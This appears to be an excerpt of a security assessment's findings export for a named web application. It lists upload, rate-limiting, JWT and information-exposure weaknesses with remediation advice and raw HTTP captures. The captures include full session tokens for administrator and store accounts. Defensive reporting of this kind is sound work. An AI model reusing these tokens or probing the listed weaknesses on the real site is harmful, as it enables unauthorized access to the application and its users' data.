+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Xss-Protection: 0
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Access-Control-Allow-Private-Network: true
+Access-Control-Allow-Origin: https://trvc.titan.in
+Access-Control-Allow-Credentials: true
+Ratelimit-Policy: 1000;w=60
+Ratelimit-Limit: 1000
+Ratelimit-Remaining: 990
+Ratelimit-Reset: 2
+X-Powered-By: ARR/3.0
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Mon, 28 Sep 2026 12:19:12 GMT
+Content-Length: 1995",https://trvc.titan.in/api/customers/%230007/feedback-image/1,https://trvc.titan.in/api/customers/%230007/feedback-image/1,"An attacker with access to the affected upload functionality could upload a malicious SVG file and share or cause a privileged user to access the stored file. Successful exploitation could allow JavaScript to execute within the application's security context, potentially enabling unauthorized actions, access to sensitive information available to the victim's session, manipulation of application content, and compromise of privileged user interactions."
+12,5588626,File Upload Vulnerability(Unrestricted File Upload),29-09-2026 05:30,29-09-2026 05:30,NEW,Medium,https://trvc.titan.in/api/videos,It was observed that the application allows uploading files with an executable .exe extension through the video upload functionality without enforcing a proper file type restriction.,"Unrestricted file upload occurs when an application accepts files without properly validating their extension, MIME type, and actual file content. In the observed case, the video upload functionality accepted a file named with an .exe extension while the request declared its content type as video/mp4. The server processed the upload successfully and stored the file, indicating insufficient server-side validation of the uploaded file type.
+
+The application allows users to upload files without properly validating the file type or extension. While no code execution is confirmed, the ability to upload potentially dangerous files (e.g., .php, .jsp) increases the risk of server-side compromise if further misconfigurations exist.
+
+This can lead to Remote Code Execution (RCE), data exfiltration, or website defacement, especially if the uploaded files are accessible via a public directory.","Allow only required video extensions such as .mp4, .webm, and other approved formats.
+
+Validate the file extension, MIME type, and actual file signature/content on the server side.
+
+Do not rely on the Content-Type header or client-side validation.
+
+Reject executable extensions such as .exe, .bat, .cmd, .sh, .dll, .php, .jsp, and similar potentially dangerous file types.
+
+Store uploaded files outside the web root where possible.
+
+Rename uploaded files using server-generated random names and avoid preserving user-controlled extensions.
+
+Configure the file storage location so uploaded content cannot be executed as server-side code.
+
+Implement file size limits and malware/antivirus scanning where appropriate.
+
+Implement Strict Allowlist Validation
+Only allow specific, safe file types (e.g., .jpg, .png, .pdf) and validate both the extension and MIME type on the server side.
+
+Store Files Outside the Web Root
+Prevent direct access to uploaded files by storing them in directories not served by the web server.
+
+Rename Uploaded Files and Sanitize Input
+Use random or hashed filenames (e.g., UUIDs) and remove any user-supplied extensions to prevent execution.
+
+",,5.4,AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N,Unrestricted Upload of File with Dangerous Type,A02:2025 - Security Misconfiguration,"POST /api/videos HTTP/2
+Host: trvc.titan.in
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGdtYWlsLmNvbSIsIm5hbWUiOiJTdXBlciBBZG1pbiIsInJvbGUiOiJzdXBlcl9hZG1pbiIsImV4cCI6MTc5MjkwNzg0NjM4NX0.zfs0GiMu8zd0Yuzwt50dUX40mHjqiWhy60a2hp_JqAw
+Content-Length: 317
+Sec-Ch-Ua-Platform: ""Windows""
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: ""Chromium"";v=""151"", ""Not=A?Brand"";v=""99""
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+X-E2ee-Client: true
+Accept: application/json, text/plain, */*
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfusXO5b7PI4m3SLp
+Origin: https://trvc.titan.in
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://trvc.titan.in/super-admin
+Accept-Encoding: gzip, deflate, b
+Priority: u=1, i
+Connection: keep-alive","HTTP/2 201 Created
+Cache-Control: no-store, no-cache, must-revalidate, private,no-cache, no-store, must-revalidate
+Pragma: no-cache,no-cache
+Content-Type: application/json; charset=utf-8
+Expires: 0
+Etag: W/""1eb-pipEuaAGW1AMk9hHWB3/vZ73ggs""
+Vary: Origin
+X-Request-Id: 11cab19a-46d3-4507-a99e-98455d6b95c2
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Xss-Protection: 0
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Access-Control-Allow-Private-Network: true
+Access-Control-Allow-Origin: https://trvc.titan.in
+Access-Control-Allow-Credentials: true
+Ratelimit-Policy: 1000;w=60
+Ratelimit-Limit: 1000
+Ratelimit-Remaining: 948
+Ratelimit-Reset: 26
+X-Powered-By: ARR/3.0
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Fri, 25 Sep 2026 07:28:48 GMT
+Content-Length: 491",https://trvc.titan.in/api/videos,https://trvc.titan.in/api/videos,"An attacker with access to the upload functionality could upload unauthorized or potentially malicious files to the application. If the uploaded files are later served to other users or processed by backend systems, this could be abused for malware distribution, content manipulation, or potentially further attacks depending on how uploaded files are handled and exposed."
+13,5588622,Missing Web API Rate Limiting,29-09-2026 05:30,29-09-2026 05:30,NEW,Medium,https://trvc.titan.in/api/videos,"It was observed that the file upload API does not enforce adequate rate limiting, allowing multiple upload requests to be submitted within a short period.",Web API (Application Programming Interfaces)  is a framework which allows you to build HTTP services for Web Servers or Web Clients. Web API rate limiting is defined to control the rate of requests that an user can make to a Web API in a given span of time. Attacker can perform DDOS attacks by sending massive amount of API requests if rate limiting or throttling is missing and can misuse the API service.,"It is recommended to implement Throttling / rate-limit in either ways - /n 1. user / IP based rate-limit: this defines the number of request a user or a client IP can make per the span of time. /n 2. Server based: this defines the server rejecting the requests post a threshold is reached for handling the requests; not restricting to any specific user.
+In either case; this will allow legit traffic and requests to be processed by the server and avoid redundant data.
+Limit the number of upload requests per user/IP within a defined time window.
+Return HTTP 429 Too Many Requests when the limit is exceeded.
+Apply limits based on authenticated user identity as well as source IP.
+Enforce reasonable file-size and total-storage quotas.
+Implement monitoring and alerting for unusually high upload activity.
+Consider temporary blocking or progressive delays for repeated violations.",,5.3,AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,Allocation of File Descriptors or Handles Without Limits or Throttling,A02:2025 - Security Misconfiguration,"POST /api/videos HTTP/2
+Host: trvc.titan.in
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGdtYWlsLmNvbSIsIm5hbWUiOiJTdXBlciBBZG1pbiIsInJvbGUiOiJzdXBlcl9hZG1pbiIsImV4cCI6MTc5MjkwNzg0NjM4NX0.zfs0GiMu8zd0Yuzwt50dUX40mHjqiWhy60a2hp_JqAw
+Content-Length: 317
+Sec-Ch-Ua-Platform: ""Windows""
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: ""Chromium"";v=""151"", ""Not=A?Brand"";v=""99""
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+X-E2ee-Client: true
+Accept: application/json, text/plain, */*
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfusXO5b7PI4m3SLp
+Origin: https://trvc.titan.in
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://trvc.titan.in/super-admin
+Accept-Encoding: gzip, deflate, b
+Priority: u=1, i
+Connection: keep-alive","HTTP/2 201 Created
+Cache-Control: no-store, no-cache, must-revalidate, private,no-cache, no-store, must-revalidate
+Pragma: no-cache,no-cache
+Content-Type: application/json; charset=utf-8
+Expires: 0
+Etag: W/""1eb-pipEuaAGW1AMk9hHWB3/vZ73ggs""
+Vary: Origin
+X-Request-Id: 11cab19a-46d3-4507-a99e-98455d6b95c2
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Xss-Protection: 0
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Access-Control-Allow-Private-Network: true
+Access-Control-Allow-Origin: https://trvc.titan.in
+Access-Control-Allow-Credentials: true
+Ratelimit-Policy: 1000;w=60
+Ratelimit-Limit: 1000
+Ratelimit-Remaining: 948
+Ratelimit-Reset: 26
+X-Powered-By: ARR/3.0
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Fri, 25 Sep 2026 07:28:48 GMT
+Content-Length: 491",https://trvc.titan.in/api/videos,https://trvc.titan.in/api/videos,"An attacker with a valid account could repeatedly invoke the file upload functionality and generate a large number of uploads in a short period. This may consume application and storage resources, create unnecessary data, increase operational costs, and potentially affect application availability if the endpoint is heavily abused."
+14,5588621,Robots.txt File Detected,29-09-2026 05:30,29-09-2026 05:30,NEW,Low,https://trvc.titan.in/robots.txt,It was observed that the application's robots.txt file discloses restricted application paths and a sitemap URL.,Website owners use robots.txt file to give instructions about their site to web robots. Robots.txt file It is robot exclusion standard to prevent robots from accessing parts of website. Robots.txt file found is not vulnerability but it displays information about site web directory which may help an attacker to launch more sophisticated attacks.,This is not vulnerability. Site owner should review the contents that has been placed in robots.txt as the file is publicly accessible and put in root directory. It should comply with organization policy.,.,3.1,AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N,Information Exposure,A02:2025 - Security Misconfiguration,"GET /robots.txt HTTP/2
+Host: trvc.titan.in
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGdtYWlsLmNvbSIsIm5hbWUiOiJTdXBlciBBZG1pbiIsInJvbGUiOiJzdXBlcl9hZG1pbiIsImV4cCI6MTc5MjkwNzg0NjM4NX0.zfs0GiMu8zd0Yuzwt50dUX40mHjqiWhy60a2hp_JqAw
+Sec-Ch-Ua: ""Chromium"";v=""151"", ""Not=A?Brand"";v=""99""
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: ""Windows""
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i","HTTP/2 200 OK
+Cache-Control: no-cache,no-cache, no-store, must-revalidate
+Pragma: no-cache
+Content-Type: text/plain
+Last-Modified: Wed, 09 Sep 2026 07:19:38 GMT
+Accept-Ranges: bytes
+Etag: ""0a1b3922b40dd1:0""
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Fri, 25 Sep 2026 06:25:50 GMT
+Content-Length: 112",https://trvc.titan.in/robots.txt,https://trvc.titan.in/robots.txt,An attacker can access the publicly available robots.txt file and identify paths such as /api/ and /assets/ that are intended to be excluded from crawling. This information may assist in application reconnaissance and help an attacker identify endpoints for further security testing
+15,5588617,JWT misconfiguration,29-09-2026 05:30,29-09-2026 05:30,NEW,Low,https://trvc.titan.in/api/login,"It was observed that the JWT token is configured with an extended expiration period, allowing the token to remain valid for a longer duration than required.","JSON Web Token (JWT) is a standard for creating tokens that assert some number of claims. For example, a server could generate a token that has the claim ""logged in as admin"" and provide that to a client. The client could then use that token to prove that they are logged in as admin. An attacker can take over the account of the victim if authorization tokens are not configured properly.","Configure a short expiration time for access tokens based on the application's security requirements.
+Use short-lived JWT access tokens and implement refresh tokens for maintaining sessions.
+Invalidate or revoke tokens when users log out or when suspicious activity is detected.
+Avoid using unnecessarily long-lived JWTs, especially for privileged accounts.
+Regularly review JWT expiration and session-management configurations.",,3.7,AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N,Improper Verification of Cryptographic Signature,A07:2025 - Authentication Failures,"POST /api/login HTTP/2
+Host: trvc.titan.in
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://trvc.titan.in/login
+Content-Type: application/json
+X-E2ee-Client: true
+Content-Length: 211
+Origin: https://trvc.titan.in
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers","HTTP/2 200 OK
+Cache-Control: no-store, no-cache, must-revalidate, private,no-cache, no-store, must-revalidate
+Pragma: no-cache,no-cache
+Content-Type: application/json; charset=utf-8
+Expires: 0
+Etag: W/""ef-QIyYn8qKO7Cg4a2nSaJQ7Wp0pbY""
+Vary: Origin
+Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGdtYWlsLmNvbSIsIm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcl9hZG1pbiIsImV4cCI6MTc5MzE4NjI3OTc2M30.qIPTGy8saFZI50giVzSuSGozqp22ikMT_ufqmh7QK5Q; Path=/; HttpOnly; Secure; SameSite=Strict
+X-Request-Id: 1dd3f0b8-4ae0-4e8c-b6a7-4b10e38a0c58
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Xss-Protection: 0
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Access-Control-Allow-Private-Network: true
+Access-Control-Allow-Origin: https://trvc.titan.in
+Access-Control-Allow-Credentials: true
+Ratelimit-Policy: 20;w=900
+Ratelimit-Limit: 20
+Ratelimit-Remaining: 19
+Ratelimit-Reset: 900
+X-Powered-By: ARR/3.0
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Mon, 28 Sep 2026 11:17:59 GMT
+Content-Length: 239",https://trvc.titan.in/api/login,https://trvc.titan.in/api/login,"An attacker who obtains a valid JWT may be able to use the token to access the application until it expires. A long token lifetime increases the window during which a stolen token can potentially be misused, particularly if the token belongs to a privileged account."
+16,5588613,Session ID in Persistent Cookies,29-09-2026 05:30,29-09-2026 05:30,NEW,Medium,https://trvc.titan.in/store,"It was observed that sensitive user information, including the email address, username, and role, is stored in the browser's Local Storage.",Local Storage allows web applications to store data in the user's browser. Data stored in Local Storage is accessible to client-side JavaScript and remains available until it is manually removed or cleared by the application or browser. Storing sensitive information in Local Storage can expose it to client-side attacks such as Cross-Site Scripting (XSS).,"Avoid storing sensitive user information in Local Storage.
+Store only non-sensitive client-side data when required.
+Keep authorization and privilege information on the server side and validate it for every sensitive operation.
+If client-side storage is required, minimize the stored information and ensure strong XSS protection through proper input validation and output encoding.
+Review existing Local Storage entries and remove sensitive information that is not required by the client application.",,5.4,AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N,Sensitive Cookie in HTTPS Session Without 'Secure' Attribute,A07:2025 - Authentication Failures,"GET /store HTTP/2
+Host: trvc.titan.in
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InN0b3JlQGdtYWlsLmNvbSIsIm5hbWUiOiJUQ09SIiwicm9sZSI6InN0b3JlIiwic3RvcmVOYW1lIjoiVENPUiIsImV4cCI6MTc5MzE4NjQ1NTAzNX0.sHbjYigncktnJ2Qv12kgtr4UU-Dd8PeODUSN13K3UR0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive","HTTP/2 200 OK
+Cache-Control: no-cache,no-cache, no-store, must-revalidate
+Pragma: no-cache
+Content-Type: text/html
+Last-Modified: Wed, 09 Sep 2026 07:19:38 GMT
+Accept-Ranges: bytes
+Etag: ""0a1b3922b40dd1:0""
+Vary: Accept-Encoding
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Mon, 28 Sep 2026 12:27:55 GMT
+Content-Length: 10897",https://trvc.titan.in/store,https://trvc.titan.in/store,"An attacker who gains the ability to execute JavaScript in the application's context may be able to access the information stored in Local Storage. In this case, user-related information such as the email address, name, and privileged role is exposed, which could assist an attacker in understanding the current user's privileges and potentially support further attacks."
+17,5588610,HTTP OPTIONS Method Enabled,29-09-2026 05:30,29-09-2026 05:30,NEW,Low,https://trvc.titan.in/login,It was observed that the HTTP OPTIONS method is enabled on the application and is advertised through the Allow and Public response headers.,"The OPTIONS method provides a list of the methods that are supported by the web server, it represents a request for information about the communication options available on the request/response chain identified by the Request-URI. It may expose sensitive information that may help an malicious user to prepare more advanced attacks.",Disable OPTIONS Method on the web server.,.,3.7,AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N,Configuration,A02:2025 - Security Misconfiguration,"OPTIONS /login HTTP/2
+Host: trvc.titan.in
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
